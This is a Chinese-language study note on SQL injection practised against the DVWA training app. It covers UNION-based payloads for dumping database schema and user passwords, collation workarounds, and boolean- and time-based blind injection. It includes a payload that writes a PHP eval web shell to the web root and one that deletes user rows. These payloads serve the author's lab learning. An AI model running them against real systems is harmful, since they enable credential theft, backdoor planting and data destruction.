# SQL注入漏洞

## 1.普通SQL注入

#### 一、第一步：寻找并验证注入点（核心前置）

这一步的目标是**确定哪里能注入、是什么类型的注入**，是后续所有操作的基础。

表格

|           测试位置           |                    测试方法                    |                           判定依据                           |
| :--------------------------: | :--------------------------------------------: | :----------------------------------------------------------: |
|       URL 参数（id=1）       |           在参数后加单引号：`id=1'`            | 页面报错（如 MySQL 的 `You have an error in your SQL syntax`）→ 存在注入 |
|          POST 表单           |         登录框 / 留言框输入 `'` 或 `"`         |           提交后页面报错 / 内容显示异常 → 存在注入           |
| HTTP 头（Cookie/User-Agent） | 抓包修改 Cookie 值为 `1'` 或 User-Agent 加 `'` |               响应包返回数据库错误 → 存在注入                |

#### 二、第二步：判定注入类型（精准定位攻击方式）

1. **数字型注入**
   - 测试 payload：`id=1 and 1=1`（页面正常）、`id=1 and 1=2`（页面异常）
   - 核心特征：参数无引号包裹（原 SQL：`select * from table where id=1`）
2. **字符型注入**
   - 测试 payload：`id=1' and '1'='1`（正常）、`id=1' and '1'='2`（异常）
   - 核心特征：参数有引号包裹（原 SQL：`select * from table where id='1'`），需先闭合引号
3. **显错注入 vs 盲注**
   - 显错注入：页面直接返回数据库报错（如字段数不匹配、语法错误）→ 优先用，效率高
   - 盲注：页面无报错 / 无数据回显 → 需用 `sleep()`、`if()`、`substr()` 逐字符猜解（效率低）

#### 三、第三步：探测数据库结构（关键）

1. **判断字段数（输出点）**

   - 用 `order by` 逐步测试：`id=1' order by 1 #`（正常）→ `order by 2 #`（正常）→ `order by 3 #`（报错）
   - 结果：报错时的数字 - 1 = 实际字段数（如上例字段数为 2）

2. **获取数据库版本**

   - MySQL：`id=1' union select 1,version() #`
   - SQL Server：`id=1' union select 1,@@version --`

3. **获取所有数据库名**

   sql

   ```
   id=1' union select 1,group_concat(schema_name) from information_schema.schemata #
   ```

   - `group_concat()`：把多行结果合并成一行（避免页面只显示一条）

4. **获取当前库的所有表名**

   sql

   ```
   id=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
   ```

   - `database()`：自动获取当前数据库名（无需手动写死 `dvwa`）

5. **获取表的所有列名**

   sql

   ```
   -- 方式1：直接用单引号（需闭合）
   id=1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
   -- 方式2：十六进制编码（避免引号冲突，更通用）
   id=1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #
   ```

#### 四、第四步：执行恶意操作（最终目标）

1. **读取敏感数据（核心）**

   sql

   ```
   -- 读取 users 表的 username 和 password
   id=1' union select username,password from users #
   -- 合并所有结果（避免分页）
   id=1' union select 1,group_concat(username,':',password) from users #
   ```

2. **其他恶意操作（高权限下）**

   - 写入文件：`id=1' union select 1,"<?php @eval($_POST['cmd']);?>" into outfile "/var/www/html/shell.php" #`
   - 删改数据：`id=1'; delete from users where id=1 #`（谨慎测试！）

### 关键实战技巧（避坑 + 提效）

1. **注释符的正确使用**
   - MySQL：`#` 或 `--+`（`--` 后必须加空格 /`+`，否则不生效）
   - SQL Server：`--`（双横线后加空格）
   - 作用：截断原 SQL 语句的剩余部分（避免语法错误）
2. **字符集冲突解决**
   - 遇到 `Illegal mix of collations` 报错：把数字常量改成字符串 `id=1' union select '1',version() #`
3. **盲注效率提升**
   - 用 `substr()` + `ascii()` 批量猜解：`id=1' and ascii(substr(database(),1,1))=100 #`（100 是 `d` 的 ASCII 码）

## 2..普通SQL知识的扩展

### 1.union：

`UNION` 用来合并两个 `SELECT` 查询的结果集，**要求前后两个查询返回的列数完全相同，且对应列的类型要兼容**。

注意这句话：**要求前后两个查询返回的列数完全相同，且对应列的类型要兼容**。

### 2.占位符？

| 占位符写法  | 含义       | 适用场景                            |
| ----------- | ---------- | ----------------------------------- |
| `1`         | 数字常量   | 通用，优先用                        |
| `'1'`       | 字符串常量 | 解决 collation 冲突（你之前的报错） |
| `null`      | 空值       | 不确定原列类型时用（兼容性最强）    |
| `version()` | 函数返回值 | 顺便获取数据库版本（一举两得）      |

2.什么是占位符？

因为union：规则是列数必须相等，但是我们的查询只会返回一个结果，如果上一个查询是2列或者是3列要是多列的话，你一个返回结果肯定不可能和人家两行三行或者多行对齐啊，这个时候就需要占行符，比如说用1去占位你没有返回参数的那一列，从而和上一个查询，的列保持一致，并且，由于对应列的类型要兼容，所以说就有不同的占位符

### 3.占位符使用规则

1.列数必须一致

既然原查询是 2 列，注入查询就必须凑够 2 列 ——**核心列保留，剩下的都用占位符填充**：

```php
id=1' union select 1,group_concat(schema_name) from information_schema.schemata #
```

既然原查询是 3 列，注入查询就必须凑够 3 列 ——**核心列保留，剩下的都用占位符填充**：

```php
id=1' union select 1, 1, group_concat(schema_name) from information_schema.schemata #
```

2.查修内容可以放在任意位置

```php
id=1' union select NULL, NULL, group_concat(table_name), NULL, NULL from information_schema.tables where table_schema=database() #
```

   table_name:是查询内容，表名

   group_concat（）：是函数把查询出来的多行内容拼接到一行上

### 4.兼容

#### 1.双兼容问题

兼容问题，它不只是简单的类型兼容，它还要有排布规则，兼容是一种双兼容问题

##### 1.类型兼容问题

这种问题是最简单的，就比如说你是字符串，就和字符串兼容，你是数字就和数字兼容，如果你不知道自己是什么，就用null兼容

一般这种情况，都是占位符，不兼容，所以当占位符，类型不兼容时直接换占位符

##### 2.排布规则不兼容(collation )

<!--这个只会出现在字符串里，数字没有这种情况-->

因为老外的语法多，比如说法语了德语了英语了，导致他们的输出也不是那么的相同，导致他们就有特定的排布规则，所以当输出时，你上一个文档查的英语，你下一个文档就不能输出德语，所以这个时候就有了排布规则(例如，区不区分大小写？是不是二进制,等等)

1.所以为了解决以上这个问题，我们就用两种解决办法

1.强制指定collation

```php
id=1' union select null, group_concat(table_name) collate utf8_general_ci from information_schema.tables where table_schema=database() #
```

因为「通用规则 utf8_general_ci（不区分大小写）」（90% 直接过）

collate：强制指定排布规则函数；用法是直接把指定类型跟在这个函数的后面

2.用 cast () 转成 “无规矩的字符串”（100% 过）

`cast(group_concat(table_name) as char)` 会把字符串转成「无特定 collation 属性」的纯字符串，MySQL 会自动适配原表的规则，根本不用管原表是什么规矩：

```php
id=1' union select null, cast(group_concat(table_name) as char) from information_schema.tables where table_schema=database() #
```

#### 2.常见的collation

| 规则类型           | 核心特点                        | 占比 | 实战用法                       |
| ------------------ | ------------------------------- | ---- | ------------------------------ |
| ci（不区分大小写） | utf8_general_ci/utf8_unicode_ci | 90%  | 直接指定这个，覆盖所有通用场景 |
| bin（二进制）      | utf8_bin/latin1_bin             | 8%   | 用 cast () 绕开，不用匹配      |
| cs（区分大小写）   | 德语 / 法语专属                 | 2%   | 实战几乎遇不到                 |

collation：排布规则

## 3.SQL注入的中级防御

1.由于URL中没有任何的变化所以只能在POST表单中

2.直接BP抓包

3.其他流程和普通SQL注入相同，只不过注入点变了（post）

## 4.SQL注入的高级防御

```php
$id = $_SESSION['id'];
```

总结防御原理（最精简版）

DVWA High 防御 SQL 注入的方式：

1. **不使用用户直接提交的 ID（GET/POST）**
2. **把安全的数字 ID 存在 SESSION**
3. **从 SESSION 取 ID，再拼进 SQL**
4. **攻击者无法控制 SESSION，无法注入**

2.绕过方式，直接在 SESSION进行注入











# SQL 注入（盲）

在这里我先想我自己的狂妄自大和自暴自弃，道个歉，之前学的学烦了，然后也学的太急了，还没完全学完sql注入就直接跑去打buuctf，没想到第一道题就直接给我打蒙了，完全不会，然后发现SQL注入完全没学会，我之前以为SQL盲注和SQL注入差不多，但其实还是有很大差别的，后来因为一些烂事吧，自己也自暴自弃了，是恢复了七八天才恢复过来，我这样的人还不行，我要作为一个男人，作为一个顶天立地的男子汉

## 1.与SQL 注入的不同

**普通 SQL 注入：直接看数据**

**盲 SQL 注入：不能看数据，只能猜 “对 / 错”**

## 2.内容型盲注 

内容型盲注 = 用页面有没有内容，来判断 SQL 语句是真还是假，然后一点点猜数据！

1.举例

```php
?id=2 AND database() LIKE 'd%'
```

- 如果页面显示内容 → 库名**第一个字母是 d**
- 如果不显示 → 不是 d

再猜：

```
?id=2 AND database() LIKE 'dv%'
```

有内容 → 第二个字母是 v

……

一直猜，就能得到 **dvwa**

## 3.基于时间

页面完全不变，看不出真假？

那就让数据库 “等一会儿再响应”，

通过页面加载慢不慢，来判断 SQL 语句对不对。

1.举例

```php
1' AND IF( SUBSTRING(password,1,1)='a', SLEEP(5), 0 ) #
```

- 页面等了 5 秒 → 第一位是 a
- 马上出来 → 不是 a

然后猜 b、c、d……

一位一位猜完，就能得到完整密码。

## 4.现实中怎么干？

手工猜太慢，所以大家都用工具：

**sqlmap**